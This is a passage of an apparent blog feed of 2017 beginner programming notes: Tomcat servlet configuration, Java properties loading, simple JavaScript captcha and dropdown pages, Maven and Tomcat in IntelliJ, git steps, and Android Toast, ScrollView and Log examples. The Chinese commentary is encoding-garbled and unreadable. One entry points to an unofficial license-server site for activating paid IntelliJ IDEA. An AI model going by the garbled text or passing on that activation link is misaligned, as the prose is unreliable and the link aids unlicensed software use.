}}//ÈÖçÁΩÆtomcatÊúçÂä°Âô®ÈáåÈù¢ÁöÑÊñá‰ª∂//Âú®tomcatÈáåÈù¢ÁöÑwebappsÈáåÈù¢/**---------webapps-----------|myweb---------------|WEB-INF------------------|classesÂ∞ÜÂàöÂàöÁºñËØëËøáÁöÑhelloservletÁöÑclassÊñá‰ª∂ÊîæËøõclassÔºåËÆ∞ÂæóÂ∞ÜÂåÖ‰πüÂ∏¶‰∏ä------------------|lib------------------|src------------------|web.xml*///‰∏ãÈù¢ÊòØweb.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;  version=&quot;3.1&quot;&gt;  &lt;!--ÈÖçÁΩÆ‰∏Ä‰∏™servletÁ®ãÂ∫è--&gt;  &lt;servlet&gt;    &lt;!--servletÁöÑÂÜÖÈÉ®ÂêçÁß∞ÔºåÂèØ‰ª•Ëá™ÂÆö‰πâ--&gt;    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;    &lt;!--servletÁ±ªÂêçÔºöÂåÖÂêç+ÁÆÄÂçïÁ±ªÂêç--&gt;    &lt;servlet-class&gt;com.husky.sever.HelloServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;!--servletÁöÑÂÜÖÈÉ®ÂêçÁß∞ÔºåÂíå‰∏äÈù¢ÁöÑÂêçÁß∞‰øùÊåÅ‰∏ÄËá¥--&gt;    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;    &lt;!--servletÁöÑËÆøÈóÆÂêçÁß∞Ôºö /ÂêçÁß∞--&gt;    &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;//Â∞ÜtomcatÁöÑstartup.batÁÇπÂáªÂêéÔºåÊµèËßàÂô®ËæìÂÖ•http://localhost:Á´ØÂè£Âè∑/myweb/hello</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ÈÖçÁΩÆÊñá‰ª∂Ë∑ØÂæÑÂ¶Ç‰ΩïÂÜô</title>
      <link href="/2017/11/14/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E5%A6%82%E4%BD%95%E5%86%99/"/>
      <url>/2017/11/14/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E5%A6%82%E4%BD%95%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>Demo1.java</p><pre><code>package com.husky.path;import java.io.FileReader;import java.io.InputStream;import java.util.Properties;/** * ÈÖçÁΩÆÊñá‰ª∂ÁöÑË∑ØÂæÑÂ∫îËØ•Â¶Ç‰ΩïÂéªÂÜôÔºü * ÁªùÂØπË∑ØÂæÑÔºö‰∏Ä‰∏™Êñá‰ª∂ÁöÑÂÆåÊï¥Ë∑ØÂæÑ‰ø°ÊÅØ„ÄÇ‰∏ÄËà¨ÁªùÂØπË∑ØÂæÑÂ∏¶ÁõòÁ¨¶ÔºåÊó†Ê≥ï‰ΩøÁî® * Áõ∏ÂØπË∑ØÂæÑÔºöÁõ∏ÂØπ‰∫éÂΩìÂâçÁ®ãÂ∫èÁöÑË∑ØÂæÑ„ÄÇÂΩìÂâçË∑ØÂæÑÂ∞±ÊòØÊâßË°åjavaÂëΩ‰ª§ÁöÑÊó∂ÂÄôÔºåÊéßÂà∂Âè∞ÁöÑ‰ΩçÁΩÆ * Á±ªÊñá‰ª∂Ë∑ØÂæÑÔºöÁ±ªÊñá‰ª∂Ë∑ØÂæÑÂ∞±ÊòØ‰ΩøÁî®‰∫ÜclasspathÁöÑË∑ØÂæÑÊâæÂà∞Áõ∏Â∫îÁöÑËµÑÊ∫ê * Â¶ÇÊûúÈúÄË¶Å‰ΩøÁî®Á±ªÊñá‰ª∂Ë∑ØÂæÑÈ¶ñÂÖàË¶ÅËé∑Âèñ‰∏Ä‰∏™ClassÂØπË±° * * * */public class Demo1 {    static Properties properties;    static{        try{            properties = new Properties();            Class clazz = Demo1.class;            InputStream inputStream = clazz.getResourceAsStream(&quot;/db.properties&quot;);            properties.load(inputStream);        }catch (Exception e){            e.printStackTrace();        }    }    public static void main(String[] args){        System.out.println(&quot;username:&quot;+properties.getProperty(&quot;user&quot;)+&quot;ÂØÜÁ†Å:&quot;+properties.getProperty(&quot;password&quot;));    }}</code></pre><p>db.properties</p><pre><code>user=huskypassword=dabendan</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jsÁÆÄÂçïÂ≠óÊØçÈ™åËØÅÁ†Å</title>
      <link href="/2017/11/14/js%E7%AE%80%E5%8D%95%E5%AD%97%E6%AF%8D%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
      <url>/2017/11/14/js%E7%AE%80%E5%8D%95%E5%AD%97%E6%AF%8D%E9%AA%8C%E8%AF%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        function createCode() {            var datas = [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;,&apos;E&apos;,&apos;F&apos;];            var code = &quot;&quot;;            for(var i = 0;i &lt; 4;i++){                var index = Math.floor(Math.random()*datas.length);                code += datas[index];            }            var spanNode = document.getElementById(&quot;code&quot;);            spanNode.innerHTML = code;        }        function ready() {            createCode();        }    &lt;/script&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;‰∫ßÁîüÈ™åËØÅÁ†Å&lt;/title&gt;&lt;/head&gt;&lt;body onload=&quot;ready()&quot;&gt;    &lt;span id=&quot;code&quot;&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; onclick=&quot;createCode()&quot;&gt;Áúã‰∏çÊ∏ÖÔºåÊç¢‰∏Ä‰∏™&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ÈáçÁÇπÔºö<br>1.onloadÔºåÂú®jsÈáåÈù¢ÂÜô‰∏Ä‰∏™function readyÔºàÔºâÔºåÁÑ∂ÂêéË∞ÉÁî®<br>Èò≤Ê≠¢Êâæ‰∏çÂà∞ÔºåÂõ†‰∏∫ÂàöÂºÄÂßãËøêË°åÊó∂ÔºåÊó†Ê≥ïÊâæÂà∞id code<br>2 <code>.&lt;span id=&quot;code&quot;&gt;&lt;/span&gt;&lt;a href=&quot;#&quot; onclick=&quot;createCode()&quot;&gt;Áúã‰∏çÊ∏ÖÔºåÊç¢‰∏Ä‰∏™&lt;/a&gt;</code><br>ËøôÂè•Â∞±ÊòØspanÈáåÈù¢‰∏çÊîæ‰∏úË•øÔºåÂèØ‰ª•ÂêéÊù•ÂÜçÊîæËøõÂéª</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ÂüéÂ∏ÇÁöÑËÅîÂä®Ê°Ü</title>
      <link href="/2017/11/14/%E5%9F%8E%E5%B8%82%E7%9A%84%E8%81%94%E5%8A%A8%E6%A1%86/"/>
      <url>/2017/11/14/%E5%9F%8E%E5%B8%82%E7%9A%84%E8%81%94%E5%8A%A8%E6%A1%86/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        function showCity() {            var citys = [[],[&quot;guangzhou&quot;,&quot;fousan&quot;,&quot;zhongsan&quot;],[&quot;changsha&quot;,&quot;hengyang&quot;,&quot;yueyang&quot;]];            var provinceNode = document.getElementById(&quot;province&quot;);            var selectIndex = provinceNode.selectedIndex;            var cityDatas = citys[selectIndex];            var cityNode = document.getElementById(&quot;city&quot;);//            //ÂÖàÊ∏ÖÁ©∫cityÊ°ÜÊâÄÊúâoption//            var children = cityNode.childNodes;//            for(var i = 0; i&lt;children.length ; ){//                cityNode.removeChild(children[i]);//            }            cityNode.options.length = 1;            for(var index = 0;index&lt;cityDatas.length;index++){                var option = document.createElement(&quot;option&quot;);                option.innerHTML = cityDatas[index];                cityNode.appendChild(option);            }        }    &lt;/script&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    ÁúÅ‰ªΩ&lt;select id=&quot;province&quot; onchange=&quot;showCity()&quot;&gt;            &lt;option&gt;ÁúÅ‰ªΩ&lt;/option&gt;        &lt;option&gt;Âπø‰∏ú&lt;/option&gt;        &lt;option&gt;ÊπñÂçó&lt;/option&gt;        &lt;/select&gt;    ÂüéÂ∏Ç&lt;select id=&quot;city&quot;&gt;&lt;option&gt;ÂüéÂ∏Ç&lt;/option&gt;&lt;/select&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ÂÆûÁé∞ÁöÑËÅîÂä®Ê°ÜÔºå‰∏ªË¶ÅÂ∞±ÊòØÂΩìÁ¨¨‰∏Ä‰∏™‰∏ãÊãâÊ°ÜonchangeÊó∂ÔºåËé∑ÂèñÂÖ∂‰∏≠ÁöÑselectIndexÔºåÂÜçÈÄöËøáËøô‰∏™Á¥¢ÂºïÂÄºËé∑ÂèñÈÄâ‰∏≠ÁöÑÂÖÉÁ¥†ÔºåÊ†πÊçÆÂÖÉÁ¥†Êù•ÂÆûÁé∞‰∏ã‰∏Ä‰∏™‰∏ãÊãâÊ°ÜÁöÑoption</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Áî®ideaÂàõÂª∫mavenÁÆÄÂçïÁöÑjavaÈ°πÁõÆ</title>
      <link href="/2017/11/03/%E7%94%A8idea%E5%88%9B%E5%BB%BAmaven%E7%AE%80%E5%8D%95%E7%9A%84java%E9%A1%B9%E7%9B%AE/"/>
      <url>/2017/11/03/%E7%94%A8idea%E5%88%9B%E5%BB%BAmaven%E7%AE%80%E5%8D%95%E7%9A%84java%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>È¶ñÂÖàÔºåmavenÁâπÂà´ÂÉèandroidÈáåÈù¢build.gradleÈáåÈù¢dependenciesÔºå‰∏™‰∫∫ÊÑüËßâÂæàÊ£í„ÄÇÂæàÊñπ‰æø<br>È¶ñÂÖàÔºåeclipseÂàõÂª∫mavenÂæàÁÆÄÂçïÔºå‰Ω†Âú®ÂàõÂª∫ÁöÑÊó∂ÂÄôÔºå‰∏ãÈù¢‰ºöÊúâmaven project.</p><hr><p>ËøõÂÖ•‰∏ªÈ¢òÔºåÂú®ideaÈáåÈù¢ÂàõÂª∫maven project<br>1.<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373898.99246931631.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>‰∏çÈÄâ‰ªª‰Ωï‰∏úË•ø<br>2. <img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373899.2424864944.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÈöèÊÑèÂ°´ÔºåÊàë‰πü‰∏çÊòØÂ§™ÊáÇËøô‰∏™Ê†ºÂºèÔºå‰ΩÜÊòØÂπ∂‰∏çÂΩ±Âìç<br>3. <img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373899.75374461493.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÁÑ∂Âêéfinish<br>4. <img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373899.93146186205.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÁõÆÂΩïÂÉè‰∏äÂõæËøôÊ†∑<br>5. <img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373900.0928522763.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>‰øÆÊîπpom.xml,Âπ∂Âú®‰Ω†‰ª¨‰øÆÊîπÔºåÂØºÂÖ•org.json<br>‰øÆÊîπÁöÑÊó∂ÂÄôÔºå‰ºöÊèêÁ§∫auto-importÔºå‰Ω†ÈÄâÊã©‰∏Ä‰∏ãËøô‰∏™<br>6. <img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373900.32470567518.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>ÂàõÂª∫‰∏Ä‰∏™javaÁ®ãÂ∫èÔºåÊµãËØï‰∏Ä‰∏ãÔºåÈÄöËøáimport org.json.JSONObjectÔºåÁúãÊòØÂê¶ÂØºÂÖ•ÊàêÂäü</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> maven </tag>
            
            <tag> idea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idea ÈÖçÁΩÆ tomcat</title>
      <link href="/2017/10/31/idea%20%E9%85%8D%E7%BD%AE%20tomcat/"/>
      <url>/2017/10/31/idea%20%E9%85%8D%E7%BD%AE%20tomcat/</url>
      
        <content type="html"><![CDATA[<p><a href="https://jingyan.baidu.com/article/20b68a88592e06796cec6234.html" target="_blank" rel="noopener"> Âá∫Áé∞unable to open the service tomcatÊÄé‰πàÂäû</a></p><p>ÂÖ∑‰ΩìÈÖçÁΩÆ<br><a href="http://blog.csdn.net/maomengmeng/article/details/52043928/" target="_blank" rel="noopener"> IntelliJ IDEA 2016.2 ÈÖçÁΩÆTomcat ËøêË°åWebÈ°πÁõÆ</a><br>‰∏äÈù¢Ëøô‰∏™ÈÖçÁΩÆÂøÖÈ°ªÊòØÊî∂Ë¥πÁâàÁöÑÔºåÂõ†‰∏∫Á§æÂå∫Áâà‰∏çÊîØÊåÅtomcatËøô‰∫õÔºåÂÖ∑‰Ωì‰Ω†ÂèØ‰ª•Âú®ideaÂÆòÁΩë‰∏äÈù¢ÁúãÂà∞„ÄÇÊî∂Ë¥πÁâàÁöÑÊ≥®ÂÜåÁ†ÅÔºålicense serverÔºåÔºå <a href="http://idea.iteblog.com/key.php" target="_blank" rel="noopener"><br>http://idea.iteblog.com/key.php </a><br>ÈÖçÁΩÆÂΩì‰∏≠ÂîØ‰∏ÄÊúâ‰∏™Â∞èÁº∫ÁÇπÂ∞±ÊòØÂú® ![ËøôÈáåÂÜôÂõæÁâáÊèèËø∞](<a href="http://qjrzrivoh.hd-" target="_blank" rel="noopener">http://qjrzrivoh.hd-</a><br>bkt.clouddn.com/1605373901.17446359955.png)<br>application serverÈÄâÊã©configureÔºåtomcatÁöÑÂÆâË£ÖË∑ØÂæÑÔºåÁÑ∂Âêéok<br><a href="http://blog.csdn.net/rcnjtech/article/details/77914381" target="_blank" rel="noopener"> Intellij IDEA 2017ÂàõÂª∫Á¨¨‰∏Ä‰∏™Struts2Á®ãÂ∫è</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git‰∏ä‰º†È°πÁõÆ</title>
      <link href="/2017/10/11/git%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE/"/>
      <url>/2017/10/11/git%E4%B8%8A%E4%BC%A0%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<ol><li>ÊâìÂºÄgithub </li><li>create a new RepositryÔºåÂ°´ÂÜôRepository nameÔºåÁÑ∂Âêécreate repository </li><li>ÊâìÂºÄ‰Ω†Ë¶ÅÊèê‰∫§ÁöÑÈ°πÁõÆÁöÑÁõÆÂΩïÔºåÊâìÂºÄÁªàÁ´Ø </li><li>git initÂàùÂßãÂåñÁ©∫ÁöÑgit‰ªìÂ∫ì </li><li>git add . </li><li>git commit -m‚ÄùRecyclerView‚ÄùÂú®ÂºïÂè∑ÈáåÈù¢ÊòØÊ≥®ÈáäÈÉ®ÂàÜ </li><li>git remote add origin <a href="mailto:git@github.com">git@github.com</a>:pompeii666/UIPractice.gitÔºà‰ªãÁªç‰∏Ä‰∏ãÔºågit remote add + origin+‰ªìÂ∫ìÂú∞ÂùÄÔºâ‰ªìÂ∫ìÂú∞ÂùÄÊòØ‰Ω†Âú®ÂàõÂª∫Âêé‰ºöÊúâÁöÑÔºåoriginÊòØÊ†áËØÜÁ¨¶ </li><li>git push -u origin masterÂΩìÂâçÂàÜÊîØÁöÑÂÜÖÂÆπÂ∞±‰ºöË¢´Êé®ÈÄÅÂà∞ËøúÁ®ã‰ªìÂ∫ìoriginÁöÑmasterÂàÜÊîØ </li></ol><hr><p>ÂÖ∑‰ΩìËøòÂèØ‰ª•Áúã<br><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html" target="_blank" rel="noopener"> http://www.ruanyifeng.com/blog/2014/06/git_remote.html</a><br><a href="http://www.cnblogs.com/specter45/p/github.html" target="_blank" rel="noopener"> http://www.cnblogs.com/specter45/p/github.html</a></p><hr><p>Êõ¥Êñ∞È°πÁõÆ</p><ol><li>ÊâìÂºÄ‰πãÂâçÁöÑÂ∑•Á®ãÁöÑÈ°πÁõÆÁöÑÁõÆÂΩïgit status </li><li>git add .(Êõ¥Êñ∞ÂêÑ‰∏™‰øÆÊîπËøáÁöÑÊñá‰ª∂) </li><li>git statusÔºà‰ºöÂèëÁé∞Â∑≤ÁªèÊàêÂäü‰∫ÜÔºâ </li><li>git commit -a </li><li>git push </li></ol><hr><p>ÂÖ∑‰ΩìÁöÑËøòÂèØ‰ª•Áúã</p><p><a href="http://blog.csdn.net/cxc19890214/article/details/39352795" target="_blank" rel="noopener" title="Êõ¥Êñ∞È°πÁõÆ"> Êõ¥Êñ∞È°πÁõÆ </a><br><a href="http://www.jianshu.com/p/899b9e66a3db" title="Êä•ÈîôEverythingup-to-date"> Everything up-to-date </a></p>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntuÂàõÂª∫ÁÉ≠ÁÇπ</title>
      <link href="/2017/09/15/ubuntu%E5%88%9B%E5%BB%BA%E7%83%AD%E7%82%B9/"/>
      <url>/2017/09/15/ubuntu%E5%88%9B%E5%BB%BA%E7%83%AD%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/king-ding/archive/2016/10/09/ubuntuWIFI.html" target="_blank" rel="noopener"> http://www.cnblogs.com/king-ding/archive/2016/10/09/ubuntuWIFI.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ToastÂºπÂá∫‰ø°ÊÅØ</title>
      <link href="/2017/09/12/Toast%E5%BC%B9%E5%87%BA%E4%BF%A1%E6%81%AF/"/>
      <url>/2017/09/12/Toast%E5%BC%B9%E5%87%BA%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>ÂÅö‰∫Ü‰∏Ä‰∏™Âà§Êñ≠Êï∞ÈáèÁöÑÊ°ÜÔºåËåÉÂõ¥ÊòØ0-100Ôºå‰ΩÜÊòØ‰∏ÄÊó¶Â∞è‰∫é0ÔºåÊàñËÄÖÂ§ß‰∫é100ÔºåÂ∞±Ë¶ÅÊèêÁ§∫Áî®Êà∑Ôºå‰∏çËÉΩË∂äÁïå„ÄÇ<br>Ëøô‰∏™Êó∂ÂÄôÔºåÊ†πÊçÆËßÜÈ¢ë‰∏≠ÊèêÁ§∫ÔºåÁü•ÈÅì‰∫ÜToastÔºågoogle‰∫Ü‰∏Ä‰ºöÔºåÁúã‰∏çÊáÇÔºåÁÑ∂ÂêéÁúã‰∫Ü‰∏≠ÊñáÁöÑ<br>‰∏ÄËà¨Êúâ5ÁßçÔºàÂà´ÁöÑ‰∫∫ÂçöÂÆ¢‰ªãÁªçÁöÑÔºâ<br>Â∞±ËÆ≤Á¨¨‰∏ÄÁßçÂêßÔºå</p><pre><code>Toast.makeText(MainActivity.this, &quot;Hello&quot;, Toast.LENGTH_SHORT).show();</code></pre><p>‰ºöÂú®Â∫ïÈÉ®ÂºπÂá∫ÔºåhelloÔºå‰ΩÜÊòØÂ¶ÇÊûúÊòØÈÄöËøáÊåâÈíÆÊù•Ëß¶ÂèëËøô‰∏™ÔºåËÄå‰∏îÊåâÈíÆÊåâ‰∫ÜÂæàÂ§öÊ¨°Ôºå‰ºöÂØºËá¥ÔºåToast‰∏ÄÁõ¥Â≠òÂú®Âú®ËøôÂÑøÔºåÂæàÂΩ±ÂìçÁî®Êà∑‰ΩìÈ™å„ÄÇ<br>ÊâÄ‰ª•ÔºåÂèàÁúãÂà∞‰∏ÄÁØá</p><pre><code>private static Toast myToast;public static void showToast(Context context, String str) {        if(myToast == null) {            myToast = Toast.makeText(context, str, Toast.LENGTH_SHORT);        } else {            myToast.setText(str);        }        myToast.show();    }</code></pre><p>Âú®new‰∏Ä‰∏™Toast‰πãÂâçÂÖàÂà§Êñ≠Ëøô‰∏™myToastÊòØ‰∏çÊòØ‰∏∫NULL,Â¶ÇÊûú‰∏çÊòØNULLÔºåÂ∞±‰∏çË¶ÅÂÜçÂéªnew‰∫ÜÔºå‰ª•ÂÖçÈòüÂàó‰∏≠Â≠òÊîæËøáÂ§öÁöÑToast„ÄÇ<br>Â¶ÇÊûú‰∏ç‰∏∫NULLÔºåÂè™ÊòØÊîπÂèò‰∫ÜmyToastÁöÑÊòæÁ§∫ÊñáÂ≠óÔºåÂπ∂Ë∞ÉÁî®show()ÊñπÊ≥ï„ÄÇ<br>ËøôÊ†∑Â∞±ÈÅøÂÖçÈòüÂàó‰∏≠‰∫ßÁîüÂ§ßÈáèToast‰∫Ü„ÄÇ<br>ÂÖ∑‰Ωì‰ø°ÊÅØÔºåÊù•Ëá™ <a href="http://blog.csdn.net/u012575819/article/details/51194160" target="_blank" rel="noopener"> http://blog.csdn.net/u012575819/article/details/51194160</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ScrollView</title>
      <link href="/2017/09/11/ScrollView/"/>
      <url>/2017/09/11/ScrollView/</url>
      
        <content type="html"><![CDATA[<p>activity_main.xml</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;ScrollView xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:id=&quot;@+id/activity_main&quot;    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    android:padding=&quot;10dp&quot;    tools:context=&quot;com.example.android.scrollviewdemo.MainActivity&quot;&gt;    &lt;LinearLayout        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;match_parent&quot;        android:orientation=&quot;vertical&quot;&gt;        &lt;ImageView            android:id=&quot;@+id/imageView&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;200dp&quot;            android:scaleType=&quot;centerCrop&quot;            android:src=&quot;@drawable/kebe&quot;/&gt;        &lt;Button            android:id=&quot;@+id/button&quot;            android:layout_width=&quot;match_parent&quot;            android:layout_height=&quot;wrap_content&quot;            android:text=&quot;Know more&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/titleTextView&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:text=&quot;@string/title&quot;            android:textAppearance=&quot;?android:attr/textAppearanceLarge&quot;/&gt;        &lt;TextView            android:id=&quot;@+id/contentTextView&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:text=&quot;@string/content&quot;            android:textAppearance=&quot;?android:attr/textAppearanceSmall&quot;/&gt;    &lt;/LinearLayout&gt;&lt;/ScrollView&gt;</code></pre><p>![ScrollViewExampleImage](<a href="http://qjrzrivoh.hd-" target="_blank" rel="noopener">http://qjrzrivoh.hd-</a><br>bkt.clouddn.com/1605373903.40850882446.png)</p><pre><code>http://stacktips.com/tutorials/android/android-scrollview-exampleÂÖ∑‰ΩìÁúãËøôÂÑø</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log_Âêë Android Êó•Âøó‰∏≠ÂÜôÊ∂àÊÅØ</title>
      <link href="/2017/09/11/Log_%E5%90%91%20Android%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%86%99%E6%B6%88%E6%81%AF/"/>
      <url>/2017/09/11/Log_%E5%90%91%20Android%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%86%99%E6%B6%88%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>activity_main.xml</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    android:orientation=&quot;vertical&quot;    android:paddingBottom=&quot;@dimen/activity_vertical_margin&quot;    android:paddingLeft=&quot;@dimen/activity_horizontal_margin&quot;    android:paddingRight=&quot;@dimen/activity_horizontal_margin&quot;    android:paddingTop=&quot;@dimen/activity_vertical_margin&quot;    tools:context=&quot;.MainActivity&quot;&gt;    &lt;TextView        android:id=&quot;@+id/menu_item_1&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:text=&quot;Mango sorbet&quot;        android:textAppearance=&quot;?android:textAppearanceMedium&quot; /&gt;    &lt;TextView        android:id=&quot;@+id/menu_item_2&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_marginTop=&quot;8dp&quot;        android:text=&quot;Blueberry pie&quot;        android:textAppearance=&quot;?android:textAppearanceMedium&quot;        android:textSize=&quot;18sp&quot; /&gt;    &lt;TextView        android:id=&quot;@+id/menu_item_3&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_marginTop=&quot;8dp&quot;        android:text=&quot;Chocolate lava cake&quot;        android:textAppearance=&quot;?android:textAppearanceMedium&quot;        android:textSize=&quot;18sp&quot; /&gt;    &lt;Button        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot;        android:layout_marginTop=&quot;8dp&quot;        android:onClick=&quot;printToLogs&quot;        android:text=&quot;Print menu to logs&quot; /&gt;&lt;/LinearLayout&gt;</code></pre><p>MainActivity.java</p><pre><code>package com.example.android.menu;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.util.Log;import android.view.View;import android.widget.TextView;public class MainActivity extends AppCompatActivity {    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);    }    public void printToLogs(View view){        // Find first menu item TextView and print the text to the logs        TextView temp = (TextView) findViewById(R.id.menu_item_1);        String tempString = temp.getText().toString();        Log.i(&quot;MainActivity&quot;,tempString);        // Find second menu item TextView and print the text to the logs        temp = (TextView) findViewById(R.id.menu_item_2);        tempString = temp.getText().toString();        Log.i(&quot;MainActivity&quot;,tempString);        // Find third menu item TextView and print the text to the logs        temp = (TextView) findViewById(R.id.menu_item_3);        tempString = temp.getText().toString();        Log.i(&quot;MainActivity&quot;,tempString);    }}</code></pre><p><strong>ÈáçÁÇπÂÜÖÂÆπ</strong></p><ol><li>ËøôÈáåÔºåÊàë‰ª¨‰ΩøÁî®‰∫Ü Log.i()ÔºåË°®Á§∫‚Äú‰ø°ÊÅØ‚ÄùÁ∫ßÂà´ÁöÑÊó•Âøó„ÄÇÂÖ∂‰ªñÁ∫ßÂà´ÁöÑÈÄâÈ°πÂ¶Ç‰∏ãÊâÄÁ§∫Ôºö </li></ol><p>e(String, String)ÔºàÈîôËØØÔºâ<br>w(String, String)ÔºàË≠¶ÂëäÔºâ<br>i(String, String)Ôºà‰ø°ÊÅØÔºâ<br>d(String, String)ÔºàË∞ÉËØïÔºâ<br>v(String, String) (ËØ¶ÊÉÖ)<br>2.ÂÖ∑‰ΩìÂ∫îËØ•ÊòØÂú®ÊåâÊåâÈíÆÊó∂‰ΩøÁî®ÁöÑÔºåÊ≠£Â•ΩË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ï„ÄÇ<br>3.Êü•ÁúãÊñπÂºèÔºöandroid studioÈáåÈù¢ÔºåÊúÄ‰∏ãÈù¢Êúâ‰∏Ä‰∏™android<br>monitorÔºåÈáåÈù¢ÁöÑlogcatÔºåÂ¶ÇÊûúÊòØLog.iÂàôÈÄâÊã©infoÔºåÁÑ∂ÂêéÂèØ‰ª•ËæìÂÖ•tagËøòÊòØ‰∏ãÊãâtagÔºåÂèØ‰ª•ÊâæÂà∞ÂÖ∑‰Ωì‰ø°ÊÅØ</p>]]></content>
      
      
      
        <tags>
            
            <tag> androidÂ≠¶‰π†Á¨îËÆ∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ËÆ°ÂàÜÂô®</title>
      <link href="/2017/09/10/%E8%AE%A1%E5%88%86%E5%99%A8/"/>
      <url>/2017/09/10/%E8%AE%A1%E5%88%86%E5%99%A8/</url>
      
